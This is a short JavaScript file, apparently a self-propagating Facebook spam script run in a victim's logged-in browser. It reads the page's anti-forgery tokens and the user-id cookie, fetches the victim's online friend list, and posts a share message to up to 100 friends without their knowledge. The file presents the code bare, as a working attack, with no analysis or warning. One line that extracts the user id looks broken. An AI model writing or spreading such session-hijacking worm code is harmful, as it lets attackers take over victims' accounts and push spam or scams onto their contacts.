function getRandomInt(min,max){return Math.floor(Math.random() * (max - min + 1)) + min}
function randomValue(arr){return arr[getRandomInt(0, arr.length-1)]}

var post_form_id = document.getElementsByName('post_form_id')[0].value;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

var message = "hello";

var http3 = new XMLHttpRequest();
var url3 = "http://www.facebook.com/ajax/chat/buddy_list.php?__a=1";
var params3 = "user=" + user_id + "&popped_out=false&force_render=true&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest";
http3['open']("POST", url3, true);
http3['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
http3['setRequestHeader']("Content-length", params3['length']);
http3['setRequestHeader']("Connection", "close");
http3['onreadystatechange'] = function () {
	if (http3['readyState'] == 4 && http3['status'] == 200) {
		var response3 = http3['responseText'];
		response3 = response3.replace("for (;;);", "");
		response3 = JSON.parse(response3);
		console.log(response3);
		var count = 0;
		for (property in response3.payload.buddy_list.nowAvailableList) {
			if (count < 100) {
				var httpc = new XMLHttpRequest();
				var msgid = Math.floor(Math.random() * 1000000);
				var time = Math.round(new Date().getTime() / 1000);
				var urlc = "/ajax/sharer/submit/?__a=1";
				var paramsc ="ad_params=&friendTarget="+property+"&groupTarget=&message="+message+"&submit=Share%20Link&nctr[_mod]=pagelet_wall&__d=1&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest&__user=";
				httpc['open']("POST", urlc, true);
				httpc['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
				httpc['setRequestHeader']("Content-length", paramsc['length']);
				httpc['setRequestHeader']("Connection", "close");
				httpc['onreadystatechange'] = function () {
					if (httpc['readyState'] == 4 && httpc['status'] == 200) {}
				}
				httpc['send'](paramsc);
			}
			count++;
		}
		http3['close'];
	}
 }
 http3.send(params3);